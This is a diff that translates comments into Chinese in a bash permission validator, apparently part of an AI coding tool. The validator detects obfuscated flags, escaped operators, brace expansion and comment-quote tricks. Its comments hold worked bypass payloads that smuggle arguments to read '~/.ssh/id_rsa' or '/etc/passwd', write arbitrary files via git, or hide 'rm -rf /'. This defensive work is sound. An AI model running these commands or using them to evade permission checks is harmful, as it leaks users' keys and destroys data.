+      // 找到含字母数字字符的段或命中非引号边界。
+      // 也处理空前缀引号："""-"exec 其中 "" 后跟 "-"exec
+      // 组合段如果含 dash 后跟字母数字则形成 flag。
       const hasFlagCharsInNextQuote =
-        // Trigger when: first segment is only dashes OR empty (could be prefix for flag)
+        // 触发条件：第一段只有 dash 或为空（可能是 flag 的 prefix）
         (insideQuote === '' || /^-+$/.test(insideQuote)) &&
         charAfterQuote !== undefined &&
         /['"`]/.test(charAfterQuote) &&
         (() => {
-          let pos = j + 1 // Start at charAfterQuote (an opening quote)
-          let combinedContent = insideQuote // Track what the shell will see
+          let pos = j + 1 // 从 charAfterQuote 开始（一个开引号）
+          let combinedContent = insideQuote // 跟踪 shell 将看到的内容
           while (
             pos < originalCommand.length &&
             /['"`]/.test(originalCommand[pos]!)
@@ -1389,14 +1378,14 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
             const segment = originalCommand.slice(pos + 1, end)
             combinedContent += segment
 
-            // Check if combined content so far forms a flag pattern.
-            // Include $ and ` for in-quote expansion: "-""$VAR" → -exec
+            // 检查到目前为止的组合内容是否形成 flag 模式。
+            // 包含 $ 和 ` 用于引号内展开："-""$VAR" → -exec
             if (/^-+[a-zA-Z0-9$`]/.test(combinedContent)) return true
 
-            // If this segment has alphanumeric/expansion and we already have dashes,
-            // it's a flag. Catches "-""$*" where segment='$*' has no alnum but
-            // expands to positional params at runtime.
-            // Guard against segment.length === 0: slice(0, -0) → slice(0, 0) → ''.
+            // 如果此段有字母数字/展开且我们已有 dash，
+            // 则是 flag。捕获 "-""$*" 其中 segment='$*' 无字母数字但
+            // 运行时展开为位置参数。
+            // 防护 segment.length === 0：slice(0, -0) → slice(0, 0) → ''。
             const priorContent =
               segment.length > 0
                 ? combinedContent.slice(0, -segment.length)
@@ -1405,28 +1394,28 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
               if (/[a-zA-Z0-9$`]/.test(segment)) return true
             }
 
-            if (end >= originalCommand.length) break // Unclosed quote
-            pos = end + 1 // Move past closing quote to check next segment
+            if (end >= originalCommand.length) break // 未闭合的引号
+            pos = end + 1 // 跳过闭合引号以检查下一段
           }
-          // Also check the unquoted char at the end of the chain
+          // 也检查链末尾的未引用字符
           if (
             pos < originalCommand.length &&
             FLAG_CONTINUATION_CHARS.test(originalCommand[pos]!)
           ) {
-            // If we have dashes in combined content, the trailing char completes a flag
+            // 如果组合内容中有 dash，尾随字符完成一个 flag
             if (/^-+$/.test(combinedContent) || combinedContent === '') {
-              // Check if we're about to form a flag with the following content
+              // 检查是否将用后续内容形成 flag
               const nextChar = originalCommand[pos]!
               if (nextChar === '-') {
-                // More dashes, could still form a flag
+                // 更多 dash，仍可能形成 flag
                 return true
               }
               if (/[a-zA-Z0-9\\${`]/.test(nextChar) && combinedContent !== '') {
-                // We have dashes and now alphanumeric/expansion follows
+                // 我们有 dash 且现在跟字母数字/展开
                 return true
               }
             }
-            // Original check for dashes followed by alphanumeric
+            // 原始检查：dash 后跟字母数字
             if (/^-/.test(combinedContent)) {
               return true
             }
@@ -1451,43 +1440,44 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
       }
     }
 
-    // Look for whitespace followed by dash - this starts a flag
+    // 查找后跟 dash 的空白 —— 这开始一个 flag
     if (currentChar && nextChar && /\s/.test(currentChar) && nextChar === '-') {
-      let j = i + 1 // Start at the dash
+      let j = i + 1 // 从 dash 开始
       let flagContent = ''
 
-      // Collect flag content
+      // 收集 flag 内容
       while (j < originalCommand.length) {
         const flagChar = originalCommand[j]
         if (!flagChar) break
 
-        // End flag content once we hit whitespace or an equals sign
+        // 一旦遇到空白或等号就结束 flag 内容
         if (/[\s=]/.test(flagChar)) {
           break
         }
-        // End flag collection if we hit quote followed by non-flag character. This is needed to handle cases like -d"," which should be parsed as just -d
+        // 如果遇到引号后跟非 flag 字符，结束 flag 收集。这是为了处理
+        // 如 -d"," 这类情况，应被解析为只是 -d
         if (/['"`]/.test(flagChar)) {
-          // Special case for cut -d flag: the delimiter value can be quoted
-          // Example: cut -d'"' should parse as flag name: -d, value: '"'
-          // Note: We only apply this exception to cut -d specifically to avoid bypasses.
-          // Without this restriction, a command like `find -e"xec"` could be parsed as
-          // flag name: -e, bypassing our blocklist for -exec. By restricting to cut -d,
-          // we allow the legitimate use case while preventing obfuscation attacks on other
-          // commands where quoted flag values could hide dangerous flag names.
+          // cut -d flag 的特殊情况：分隔符值可以带引号
+          // 例如：cut -d'"' 应解析为 flag 名：-d，值：'"'
+          // 注意：我们只对 cut -d 应用此例外以避免绕过。
+          // 没有此限制，类似 `find -e"xec"` 的命令可能被解析为
+          // flag 名：-e，绕过我们对 -exec 的黑名单。限制为 cut -d，
+          // 我们允许合法用例同时防止其他命令中
+          // 带引号的 flag 值隐藏危险 flag 名的混淆攻击。
           if (
             baseCommand === 'cut' &&
             flagContent === '-d' &&
             /['"`]/.test(flagChar)
           ) {
-            // This is cut -d followed by a quoted delimiter - flagContent is already '-d'
+            // 这是 cut -d 后跟带引号的分隔符 —— flagContent 已经是 '-d'
             break
           }
 
-          // Look ahead to see what follows the quote
+          // 向前查看引号后跟随的内容
           if (j + 1 < originalCommand.length) {
             const nextFlagChar = originalCommand[j + 1]
             if (nextFlagChar && !/[a-zA-Z0-9_'"-]/.test(nextFlagChar)) {
-              // Quote followed by something that is clearly not part of a flag, end the parsing
+              // 引号后跟明显不是 flag 一部分的内容，结束解析
               break
             }
           }
@@ -1509,8 +1499,8 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // Also handle flags that start with quotes: "--"output, '-'-output, etc.
-  // Use fullyUnquotedContent to avoid false positives from legitimate quoted content like echo "---"
+  // 也处理以引号开头的 flag："--"output、'-'-output 等
+  // 使用 fullyUnquotedContent 以避免对合法引号内容如 echo "---" 的假阳性
   if (/\s['"`]-/.test(context.fullyUnquotedContent)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -1522,8 +1512,8 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
     }
   }
 
-  // Also handles cases like ""--output
-  // Use fullyUnquotedContent to avoid false positives from legitimate quoted content
+  // 也处理类似 ""--output 的情况
+  // 使用 fullyUnquotedContent 以避免对合法引号内容的假阳性
   if (/['"`]{2}-/.test(context.fullyUnquotedContent)) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.OBFUSCATED_FLAGS,
@@ -1539,14 +1529,14 @@ function validateObfuscatedFlags(context: ValidationContext): PermissionResult {
 }
 
 /**
- * Detects backslash-escaped whitespace characters (space, tab) outside of quotes.
+ * 检测引号外的反斜杠转义空白字符（空格、制表符）。
  *
- * In bash, `echo\ test` is a single token (command named "echo test"), but
- * shell-quote decodes the escape and produces `echo test` (two separate tokens).
- * This discrepancy allows path traversal attacks like:
+ * 在 bash 中，`echo\ test` 是单个 token（名为 "echo test" 的命令），但
+ * shell-quote 解码该转义并生成 `echo test`（两个独立的 token）。
+ * 这种差异允许路径遍历攻击，如：
  *   echo\ test/../../../usr/bin/touch /tmp/file
- * which the parser sees as `echo test/.../touch /tmp/file` (an echo command)
- * but bash resolves as `/usr/bin/touch /tmp/file` (via directory "echo test").
+ * 解析器看到的是 `echo test/.../touch /tmp/file`（一个 echo 命令）
+ * 但 bash 解析为 `/usr/bin/touch /tmp/file`（通过目录 "echo test"）。
  */
 function hasBackslashEscapedWhitespace(command: string): boolean {
   let inSingleQuote = false
@@ -1562,8 +1552,8 @@ function hasBackslashEscapedWhitespace(command: string): boolean {
           return true
         }
       }
-      // Skip the escaped character (both outside quotes and inside double quotes,
-      // where \\, \", \$, \` are valid escape sequences)
+      // 跳过被转义的字符（引号外和双引号内都跳过，
+      // 双引号内 \\、\"、\$、\` 是有效的转义序列）
       i++
       continue
     }
@@ -1602,30 +1592,30 @@ function validateBackslashEscapedWhitespace(
 }
 
 /**
- * Detects a backslash immediately preceding a shell operator outside of quotes.
+ * 检测引号外紧接 shell 操作符前的反斜杠。
  *
- * SECURITY: splitCommand normalizes `\;` to a bare `;` in its output string.
- * When downstream code (checkReadOnlyConstraints, checkPathConstraints, etc.)
- * re-parses that normalized string, the bare `;` is seen as an operator and
- * causes a false split. This enables arbitrary file read bypassing path checks:
+ * 安全性：splitCommand 在其输出字符串中将 `\;` 规范化为裸 `;`。
+ * 当下游代码（checkReadOnlyConstraints、checkPathConstraints 等）
+ * 重新解析该规范化字符串时，裸 `;` 被视为操作符并
+ * 导致错误的分割。这允许绕过路径检查进行任意文件读取：
  *
  *   cat safe.txt \; echo ~/.ssh/id_rsa
  *
- * In bash: ONE cat command reading safe.txt, ;, echo, ~/.ssh/id_rsa as files.
- * After splitCommand normalizes: "cat safe.txt ; echo ~/.ssh/id_rsa"
- * Nested re-parse: ["cat safe.txt", "echo ~/.ssh/id_rsa"] — both segments
- * pass isCommandReadOnly, sensitive path hidden in echo segment is never
- * validated by path constraints. Auto-allowed. Private key leaked.
+ * 在 bash 中：一个 cat 命令读取 safe.txt、;、echo、~/.ssh/id_rsa 作为文件。
+ * splitCommand 规范化后："cat safe.txt ; echo ~/.ssh/id_rsa"
+ * 嵌套重新解析：["cat safe.txt", "echo ~/.ssh/id_rsa"] —— 两段都
+ * 通过 isCommandReadOnly，隐藏在 echo 段中的敏感路径从未被
+ * 路径约束校验。自动允许。私钥泄露。
  *
- * This check flags any \<operator> regardless of backslash parity. Even counts
- * (\\;) are dangerous in bash (\\ → \, ; separates). Odd counts (\;) are safe
- * in bash but trigger the double-parse bug above. Both must be flagged.
+ * 此检查标记任何 \<operator>，无论反斜杠奇偶。偶数个
+ *（\\;）在 bash 中是危险的（\\ → \，; 分隔）。奇数个（\;）在 bash 中安全，
+ * 但会触发上述双重解析 bug。两者都必须被标记。
  *
- * Known false positive: `find . -exec cmd {} \;` — users will be prompted once.
+ * 已知假阳性：`find . -exec cmd {} \;` —— 用户将被提示一次。
  *
- * Note: `(` and `)` are NOT in this set — splitCommand preserves `\(` and `\)`
- * in its output (round-trip safe), so they don't trigger the double-parse bug.
- * This allows `find . \( -name x -o -name y \)` to pass without false positives.
+ * 注意：`(` 和 `)` 不在此集合中 —— splitCommand 在其
+ * 输出中保留 `\(` 和 `\)`（往返安全），所以它们不会触发双重解析 bug。
+ * 这允许 `find . \( -name x -o -name y \)` 无假阳性通过。
  */
 const SHELL_OPERATORS = new Set([';', '|', '&', '<', '>'])
 
@@ -1636,51 +1626,51 @@ function hasBackslashEscapedOperator(command: string): boolean {
   for (let i = 0; i < command.length; i++) {
     const char = command[i]
 
-    // SECURITY: Handle backslash FIRST, before quote toggles. In bash, inside
-    // double quotes, `\"` is an escape sequence producing a literal `"` — it
-    // does NOT close the quote. If we process quote toggles first, `\"` inside
-    // `"..."` desyncs the tracker:
-    //   - `\` is ignored (gated by !inDoubleQuote)
-    //   - `"` toggles inDoubleQuote to FALSE (wrong — bash says still inside)
-    //   - next `"` (the real closing quote) toggles BACK to TRUE — locked desync
-    //   - subsequent `\;` is missed because !inDoubleQuote is false
-    // Exploit: `tac "x\"y" \; echo ~/.ssh/id_rsa` — bash runs ONE tac reading
-    // all args as files (leaking id_rsa), but desynced tracker misses `\;` and
-    // splitCommand's double-parse normalization "sees" two safe commands.
+    // 安全性：先处理反斜杠，再处理引号切换。在 bash 中，双引号内的
+    // `\"` 是产生字面 `"` 的转义序列 —— 它
+    // 不闭合引号。如果我们先处理引号切换，`"..."` 内的 `\"`
+    // 会使跟踪器失步：
+    //   - `\` 被忽略（由 !inDoubleQuote 控制）
+    //   - `"` 将 inDoubleQuote 切换为 FALSE（错误 —— bash 认为仍在内）
+    //   - 下一个 `"`（真正的闭合引号）切换回 TRUE —— 锁定失步
+    //   - 后续 `\;` 被遗漏，因为 !inDoubleQuote 为 false
+    // 攻击：`tac "x\"y" \; echo ~/.ssh/id_rsa` —— bash 运行一个 tac 把
+    // 所有参数作为文件读取（泄露 id_rsa），但失步的跟踪器遗漏 `\;`，
+    // splitCommand 的双重解析规范化“看到”两个安全命令。
     //
-    // Fix structure matches hasBackslashEscapedWhitespace (which was correctly
-    // fixed for this in commit prior to d000dfe84e): backslash check first,
-    // gated only by !inSingleQuote (since backslash IS literal inside '...'),
-    // unconditional i++ to skip the escaped char even inside double quotes.
+    // 修复结构匹配 hasBackslashEscapedWhitespace（在 d000dfe84e 之前的
+    // commit 中已正确修复此问题）：先检查反斜杠，
+    // 只由 !inSingleQuote 控制（因为反斜杠在 '...' 内是字面值），
+    // 无条件 i++ 跳过被转义字符（即使在双引号内）。
     if (char === '\\' && !inSingleQuote) {
-      // Only flag \<operator> when OUTSIDE double quotes (inside double quotes,
-      // operators like ;|&<> are already not special, so \; is harmless there).
+      // 只在双引号外标记 \<operator>（双引号内，
+      // 操作符如 ;|&<> 已不特殊，所以 \; 在那里无害）。
       if (!inDoubleQuote) {
         const nextChar = command[i + 1]
         if (nextChar && SHELL_OPERATORS.has(nextChar)) {
           return true
         }
       }
-      // Skip the escaped character unconditionally. Inside double quotes, this
-      // correctly consumes backslash pairs: `"x\\"` → pos 6 (`\`) skips pos 7
-      // (`\`), then pos 8 (`"`) toggles inDoubleQuote off correctly. Without
-      // unconditional skip, pos 7 would see `\`, see pos 8 (`"`) as nextChar,
-      // skip it, and the closing quote would NEVER toggle inDoubleQuote —
-      // permanently desyncing and missing subsequent `\;` outside quotes.
-      // Exploit: `cat "x\\" \; echo /etc/passwd` — bash reads /etc/passwd.
+      // 无条件跳过被转义字符。双引号内，这会
+      // 正确消费反斜杠对：`"x\\"` → 位置 6（`\`）跳过位置 7
+      // （`\`），然后位置 8（`"`）正确关闭 inDoubleQuote。没有
+      // 无条件跳过，位置 7 会看到 `\`，把位置 8（`"`）视为 nextChar，
+      // 跳过它，闭合引号永远不会切换 inDoubleQuote ——
+      // 永久失步并遗漏后续引号外的 `\;`。
+      // 攻击：`cat "x\\" \; echo /etc/passwd` —— bash 读取 /etc/passwd。
       //
-      // This correctly handles backslash parity: odd-count `\;` (1, 3, 5...)
-      // is flagged (the unpaired `\` before `;` is detected). Even-count `\\;`
-      // (2, 4...) is NOT flagged, which is CORRECT — bash treats `\\` as
-      // literal `\` and `;` as a separator, so splitCommand handles it
-      // normally (no double-parse bug). This matches
-      // hasBackslashEscapedWhitespace line ~1340.
+      // 这正确处理反斜杠奇偶：奇数个 `\;`（1、3、5...）
+      // 被标记（检测到 `;` 前未配对的 `\`）。偶数个 `\\;`
+      // （2、4...）不被标记，这是 CORRECT 的 —— bash 把 `\\` 视为
+      // 字面 `\`，`;` 视为分隔符，所以 splitCommand 正常处理它
+      // （无双重解析 bug）。这匹配
+      // hasBackslashEscapedWhitespace 第 ~1340 行。
       i++
       continue
     }
 
-    // Quote toggles come AFTER backslash handling (backslash already skipped
-    // any escaped quote char, so these toggles only fire on unescaped quotes).
+    // 引号切换在反斜杠处理之后（反斜杠已跳过
+    // 任何被转义的引号字符，所以这些切换只对未转义引号触发）。
     if (char === "'" && !inDoubleQuote) {
       inSingleQuote = !inSingleQuote
       continue
@@ -1696,9 +1686,9 @@ function hasBackslashEscapedOperator(command: string): boolean {
 function validateBackslashEscapedOperators(
   context: ValidationContext,
 ): PermissionResult {
-  // Tree-sitter path: if tree-sitter confirms no actual operator nodes exist
-  // in the AST, then any \; is just an escaped character in a word argument
-  // (e.g., `find . -exec cmd {} \;`). Skip the expensive regex check.
+  // Tree-sitter 路径：如果 tree-sitter 确认 AST 中没有实际操作符节点，
+  // 则任何 \; 只是 word 参数中的转义字符
+  // （例如 `find . -exec cmd {} \;`）。跳过昂贵的 regex 检查。
   if (context.treeSitter && !context.treeSitter.hasActualOperatorNodes) {
     return { behavior: 'passthrough', message: 'No operator nodes in AST' }
   }
@@ -1721,8 +1711,8 @@ function validateBackslashEscapedOperators(
 }
 
 /**
- * Checks if a character at position `pos` in `content` is escaped by counting
- * consecutive backslashes before it. An odd number means it's escaped.
+ * 通过计算位置 `pos` 前的连续反斜杠数量，检查 `content` 中该位置的字符是否被转义。
+ * 奇数表示被转义。
  */
 function isEscapedAtPosition(content: string, pos: number): boolean {
   let backslashCount = 0
@@ -1735,44 +1725,43 @@ function isEscapedAtPosition(content: string, pos: number): boolean {
 }
 
 /**
- * Detects unquoted brace expansion syntax that Bash expands but shell-quote/tree-sitter
- * treat as literal strings. This parsing discrepancy allows permission bypass:
+ * 检测未引用的花括号展开语法，Bash 会展开但 shell-quote/tree-sitter
+ * 视为字面字符串。此解析差异允许权限绕过：
  *   git ls-remote {--upload-pack="touch /tmp/test",test}
- * Parser sees one literal arg, but Bash expands to: --upload-pack="touch /tmp/test" test
+ * 解析器看到一个字面参数，但 Bash 展开为：--upload-pack="touch /tmp/test" test
  *
- * Brace expansion has two forms:
- *   1. Comma-separated: {a,b,c} → a b c
- *   2. Sequence: {1..5} → 1 2 3 4 5
+ * 花括号展开有两种形式：
+ *   1. 逗号分隔：{a,b,c} → a b c
+ *   2. 序列：{1..5} → 1 2 3 4 5
  *
- * Both single and double quotes suppress brace expansion in Bash, so we use
- * fullyUnquotedContent which has both quote types stripped.
- * Backslash-escaped braces (\{, \}) also suppress expansion.
+ * 单引号和双引号都抑制 Bash 的花括号展开，所以我们使用
+ * 已剥离两种引号类型的 fullyUnquotedContent。
+ * 反斜杠转义的花括号（\{、\}）也抑制展开。
  */
 function validateBraceExpansion(context: ValidationContext): PermissionResult {
-  // Use pre-strip content to avoid false negatives from stripSafeRedirections
-  // creating backslash adjacencies (e.g., `\>/dev/null{a,b}` → `\{a,b}` after
-  // stripping, making isEscapedAtPosition think the brace is escaped).
+  // 使用剥离前内容以避免 stripSafeRedirections 产生反斜杠相邻
+  // 导致的假阴性（例如 `\>/dev/null{a,b}` → 剥离后 `\{a,b}`，
+  // 使 isEscapedAtPosition 认为花括号被转义）。
   const content = context.fullyUnquotedPreStrip
 
-  // SECURITY: Check for MISMATCHED brace counts in fullyUnquoted content.
-  // A mismatch indicates that quoted braces (e.g., `'{'` or `"{"`) were
-  // stripped by extractQuotedContent, leaving unbalanced braces in the content
-  // we analyze. Our depth-matching algorithm below assumes balanced braces —
-  // with a mismatch, it closes at the WRONG position, missing commas that
-  // bash's algorithm WOULD find.
+  // 安全性：检查 fullyUnquoted 内容中花括号计数不匹配。
+  // 不匹配表明引号花括号（例如 `'{'` 或 `"{"`）被
+  // extractQuotedContent 剥离，在我们分析的内容中留下不平衡的花括号。
+  // 我们下方的深度匹配算法假设花括号平衡 ——
+  // 不匹配时，它在错误位置关闭，遗漏 bash 算法会找到的逗号。
   //
-  // Exploit: `git diff {@'{'0},--output=/tmp/pwned}`
-  //   - Original: 2 `{`, 2 `}` (quoted `'{'` counts as content, not operator)
-  //   - fullyUnquoted: `git diff {@0},--output=/tmp/pwned}` — 1 `{`, 2 `}`!
-  //   - Our depth-matcher: closes at first `}` (after `0`), inner=`@0`, no `,`
-  //   - Bash (on original): quoted `{` is content; first unquoted `}` has no
-  //     `,` yet → bash treats as literal content, keeps scanning → finds `,`
-  //     → final `}` closes → expands to `@{0} --output=/tmp/pwned`
-  //   - git writes diff to /tmp/pwned. ARBITRARY FILE WRITE, ZERO PERMISSIONS.
+  // 攻击：`git diff {@'{'0},--output=/tmp/pwned}`
+  //   - 原始：2 个 `{`、2 个 `}`（引号 `'{'` 计为内容，非操作符）
+  //   - fullyUnquoted：`git diff {@0},--output=/tmp/pwned}` —— 1 个 `{`、2 个 `}`！
+  //   - 我们的深度匹配器：在第一个 `}`（`0` 之后）关闭，inner=`@0`，无 `,`
+  //   - Bash（原始）：引号 `{` 是内容；第一个未引用 `}` 还没有
+  //     `,` → bash 视为字面内容，继续扫描 → 找到 `,`
+  //     → 最终 `}` 关闭 → 展开为 `@{0} --output=/tmp/pwned`
+  //   - git 将 diff 写入 /tmp/pwned。任意文件写入，零权限。
   //
-  // We count ONLY unescaped braces (backslash-escaped braces are literal in
-  // bash). If counts mismatch AND at least one unescaped `{` exists, block —
-  // our depth-matching cannot be trusted on this content.
+  // 我们只计数未转义的花括号（反斜杠转义的花括号在 bash 中是字面值）。
+  // 如果计数不匹配且至少存在一个未转义 `{`，则屏蔽 ——
+  // 我们的深度匹配在此内容上不可信。
   let unescapedOpenBraces = 0
   let unescapedCloseBraces = 0
   for (let i = 0; i < content.length; i++) {
@@ -1782,11 +1771,11 @@ function validateBraceExpansion(context: ValidationContext): PermissionResult {
       unescapedCloseBraces++
     }
   }
-  // Only block when CLOSE count EXCEEDS open count — this is the specific
-  // attack signature. More `}` than `{` means a quoted `{` was stripped
-  // (bash saw it as content, we see extra `}` unaccounted for). The inverse
-  // (more `{` than `}`) is usually legitimate unclosed/escaped braces like
-  // `{foo` or `{a,b\}` where bash doesn't expand anyway.
+  // 只在 CLOSE 计数超过 open 计数时屏蔽 —— 这是特定的
+  // 攻击特征。`}` 比 `{` 多意味着引号 `{` 被剥离
+  // （bash 视其为内容，我们看到多余的 `}` 无对应）。反向情况
+  // （`{` 比 `}` 多）通常是合法的未闭合/转义花括号，如
+  // `{foo` 或 `{a,b\}`，bash 反正不展开。
   if (unescapedOpenBraces > 0 && unescapedCloseBraces > unescapedOpenBraces) {
     logEvent('tengu_bash_security_check_triggered', {
       checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
@@ -1799,21 +1788,21 @@ function validateBraceExpansion(context: ValidationContext): PermissionResult {
     }
   }
 
-  // SECURITY: Additionally, check the ORIGINAL command (before quote stripping)
-  // for `'{'` or `"{"` INSIDE an unquoted brace context — this is the specific
-  // attack primitive. A quoted brace inside an outer unquoted `{...}` is
-  // essentially always an obfuscation attempt; legitimate commands don't nest
-  // quoted braces inside brace expansion (awk/find patterns are fully quoted,
-  // like `awk '{print $1}'` where the OUTER brace is inside quotes too).
+  // 安全性：另外检查原始命令（剥离引号前）中
+  // 未引用花括号上下文内的 `'{'` 或 `"{"` —— 这是特定的
+  // 攻击原语。外层未引用 `{...}` 内的引号花括号
+  // 基本上始终是混淆尝试；合法命令不会在花括号展开内嵌套
+  // 引号花括号（awk/find 模式完全引用，
+  // 如 `awk '{print $1}'`，其中外层花括号也在引号内）。
   //
-  // This catches the attack even if an attacker crafts a payload with balanced
-  // stripped braces (defense-in-depth). We use a simple heuristic: if the
-  // original command has `'{'` or `'}'` or `"{"` or `"}"` (quoted single brace)
-  // AND also has an unquoted `{`, that's suspicious.
+  // 即使攻击者构造平衡剥离花括号的 payload，这也捕获攻击
+  // （纵深防御）。我们使用简单启发式：如果
+  // 原始命令有 `'{'` 或 `'}'` 或 `"{"` 或 `"}"`（引号单个花括号）
+  // 且也有未引用 `{`，则可疑。
   if (unescapedOpenBraces > 0) {
     const orig = context.originalCommand
-    // Look for quoted single-brace patterns: '{', '}', "{",  "}"
-    // These are the attack primitive — a brace char wrapped in quotes.
+    // 查找引号单花括号模式：'{'、'}'、"{"、"}"
+    // 这些是攻击原语 —— 引号包裹的花括号字符。
     if (/['"][{}]['"]/.test(orig)) {
       logEvent('tengu_bash_security_check_triggered', {
         checkId: BASH_SECURITY_CHECK_IDS.BRACE_EXPANSION,
@@ -1827,16 +1816,16 @@ function validateBraceExpansion(context: ValidationContext): PermissionResult {
     }
   }
 
-  // Scan for unescaped `{` characters, then check if they form brace expansion.
-  // We use a manual scan rather than a simple regex lookbehind because
-  // lookbehinds can't handle double-escaped backslashes (\\{ is unescaped `{`).
+  // 扫描未转义的 `{` 字符，然后检查它们是否形成花括号展开。
+  // 我们使用手动扫描而非简单的 regex 先行断言，因为
+  // 先行断言无法处理双重转义反斜杠（\\{ 是未转义 `{`）。
   for (let i = 0; i < content.length; i++) {
     if (content[i] !== '{') continue
     if (isEscapedAtPosition(content, i)) continue
 
-    // Find matching unescaped `}` by tracking nesting depth.
-    // Previous approach broke on nested `{`, missing commas between the outer
-    // `{` and the nested one (e.g., `{--upload-pack="evil",{test}}`).
+    // 通过跟踪嵌套深度查找匹配的未转义 `}`。
+    // 之前的方法在嵌套 `{` 时会中断，遗漏外层
+    // `{` 和嵌套 `{` 之间的逗号（例如 `{--upload-pack="evil",{test}}`）。
     let depth = 1
     let matchingClose = -1
     for (let j = i + 1; j < content.length; j++) {
@@ -1854,9 +1843,9 @@ function validateBraceExpansion(context: ValidationContext): PermissionResult {
 
     if (matchingClose === -1) continue
 
-    // Check for `,` or `..` at the outermost nesting level between this
-    // `{` and its matching `}`. Only depth-0 triggers matter — bash splits
-    // brace expansion at outer-level commas/sequences.
+    // 检查此 `{` 与其匹配 `}` 之间最外层嵌套级别的 `,` 或 `..`。
+    // 只有 depth-0 触发才重要 —— bash 在外层
+    // 逗号/序列处分割花括号展开。
     let innerDepth = 0
     for (let k = i + 1; k < matchingClose; k++) {
       const ch = content[k]
@@ -1881,8 +1870,8 @@ function validateBraceExpansion(context: ValidationContext): PermissionResult {
         }
       }
     }
-    // No expansion at this level — don't skip past; inner pairs will be
-    // caught by subsequent iterations of the outer loop.
+    // 此级别无展开 —— 不要跳过；内部对将由
+    // 外层循环的后续迭代捕获。
   }
 
   return {
@@ -1891,10 +1880,10 @@ function validateBraceExpansion(context: ValidationContext): PermissionResult {
   }
 }
 
-// Matches Unicode whitespace characters that shell-quote treats as word
-// separators but bash treats as literal word content. While this differential
-// is defense-favorable (shell-quote over-splits), blocking these proactively
-// prevents future edge cases.
+// 匹配 Unicode 空白字符，shell-quote 视其为词分隔符，
+// 但 bash 视其为字面词内容。虽然此差异
+// 有利于防御（shell-quote 过度拆分），但主动屏蔽这些
+// 可防止未来边缘情况。
 // eslint-disable-next-line no-misleading-character-class
 const UNICODE_WS_RE =
   /[\u00A0\u1680\u2000-\u200A\u2028\u2029\u202F\u205F\u3000\uFEFF]/
@@ -1918,27 +1907,27 @@ function validateUnicodeWhitespace(
 
 function validateMidWordHash(context: ValidationContext): PermissionResult {
   const { unquotedKeepQuoteChars } = context
-  // Match # preceded by a non-whitespace character (mid-word hash).
-  // shell-quote treats mid-word # as comment-start but bash treats it as a
-  // literal character, creating a parser differential.
+  // 匹配前导为非空白字符的 #（词中 hash）。
+  // shell-quote 把词中 # 视为注释起始，但 bash 视其为
+  // 字面字符，造成解析器差异。
   //
-  // Uses unquotedKeepQuoteChars (which preserves quote delimiters but strips
-  // quoted content) to catch quote-adjacent # like 'x'# — fullyUnquotedPreStrip
-  // would strip both quotes and content, turning 'x'# into just # (word-start).
+  // 使用 unquotedKeepQuoteChars（保留引号分隔符但剥离
+  // 引号内容）以捕获引号相邻的 # 如 'x'# —— fullyUnquotedPreStrip
+  // 会剥离引号和内容，把 'x'# 变成只是 #（词首）。
   //
-  // SECURITY: Also check the CONTINUATION-JOINED version. The context is built
-  // from the original command (pre-continuation-join). For `foo\<NL>#bar`,
-  // pre-join the `#` is preceded by `\n` (whitespace → `/\S#/` doesn't match),
-  // but post-join it's preceded by `o` (non-whitespace → matches). shell-quote
-  // operates on the post-join text (line continuations are joined in
-  // splitCommand), so the parser differential manifests on the joined text.
-  // While not directly exploitable (the `#...` fragment still prompts as its
-  // own subcommand), this is a defense-in-depth gap — shell-quote would drop
-  // post-`#` content from path extraction.
+  // 安全性：也检查 CONTINUATION-JOINED 版本。context 由
+  // 原始命令（continuation-join 之前）构建。对于 `foo\<NL>#bar`，
+  // join 前 `#` 前导是 `\n`（空白 → `/\S#/` 不匹配），
+  // join 后前导是 `o`（非空白 → 匹配）。shell-quote
+  // 在 join 后文本上操作（行续行在 splitCommand 中 join），
+  // 所以解析器差异在 join 后文本上体现。
+  // 虽然不能直接利用（`#...` 片段仍作为自己的子命令提示），
+  // 但这是纵深防御缺口 —— shell-quote 会从路径提取中丢弃
+  // `#` 后内容。
   //
-  // Exclude ${# which is bash string-length syntax (e.g., ${#var}).
-  // Note: the lookbehind must be placed immediately before # (not before \S)
-  // so that it checks the correct 2-char window.
+  // 排除 ${#，它是 bash 字符串长度语法（例如 ${#var}）。
+  // 注意：先行断言必须紧邻 # 之前（而非 \S 之前），
+  // 以检查正确的 2 字符窗口。
   const joined = unquotedKeepQuoteChars.replace(/\\+\n/g, match => {
     const backslashCount = match.length - 1
     return backslashCount % 2 === 1 ? '\\'.repeat(backslashCount - 1) : match
@@ -1962,39 +1951,37 @@ function validateMidWordHash(context: ValidationContext): PermissionResult {
 }
 
 /**
- * Detects when a `#` comment contains quote characters that would desync
- * downstream quote trackers (like extractQuotedContent).
+ * 检测 `#` 注释包含会导致下游引号跟踪器（如 extractQuotedContent）失步的引号字符的情况。
  *
- * In bash, everything after an unquoted `#` on a line is a comment — quote
- * characters inside the comment are literal text, not quote toggles. But our
- * quote-tracking functions don't handle comments, so a `'` or `"` after `#`
- * toggles their quote state. Attackers can craft `# ' "` sequences that
- * precisely desync the tracker, causing subsequent content (on following
- * lines) to appear "inside quotes" when it's actually unquoted in bash.
+ * 在 bash 中，未引用 `#` 在一行后的所有内容都是注释 —— 注释内的
+ * 引号字符是字面文本，不是引号切换。但我们的
+ * 引号跟踪函数不处理注释，所以 `#` 后的 `'` 或 `"`
+ * 会切换它们的引号状态。攻击者可构造 `# ' "` 序列
+ * 精确使跟踪器失步，导致后续内容（在后续行）
+ * 看起来“在引号内”，而 bash 中实际未引用。
  *
- * Example attack:
+ * 攻击示例：
  *   echo "it's" # ' " <<'MARKER'\n
  *   rm -rf /\n
  *   MARKER
- * In bash: `#` starts a comment, `rm -rf /` executes on line 2.
- * In extractQuotedContent: the `'` at position 14 (after #) opens a single
- * quote, and the `'` before MARKER closes it. But the `'` after MARKER opens
- * ANOTHER single quote, swallowing the newline and `rm -rf /`, so
- * validateNewlines sees no unquoted newlines.
